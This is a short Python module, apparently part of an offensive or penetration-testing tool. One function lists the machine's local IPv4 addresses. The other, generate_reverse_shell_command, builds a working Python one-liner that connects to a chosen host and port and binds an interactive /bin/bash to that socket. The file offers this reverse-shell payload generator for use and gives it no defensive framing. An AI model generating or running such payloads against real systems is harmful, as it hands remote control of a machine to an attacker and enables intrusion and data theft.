import socket
from rich.console import Console

console = Console()

def get_ip_addresses():
    ip_addresses = []
    try:
        # Get all network interfaces
        interfaces = socket.getaddrinfo(socket.gethostname(), None)
        
        # Try alternative method if the first one fails
        if not interfaces:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # We don't actually connect to 8.8.8.8, we just use it to get the default interface
            s.connect(("8.8.8.8", 80))
            ip_addresses.append(s.getsockname()[0])
            s.close()
        else:
            for interface in interfaces:
                if interface[0] == socket.AF_INET:  # IPv4 only
                    addr = interface[4][0]
                    if not addr.startswith('127.'):  # Exclude localhost
                        ip_addresses.append(addr)
                            
    except Exception as e:
        console.print(f"[red]Error getting IP addresses: {str(e)}[/red]")
    
    return list(set(ip_addresses))  # Remove duplicates

def generate_reverse_shell_command(target: str, port: int) -> str:
    return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'""" 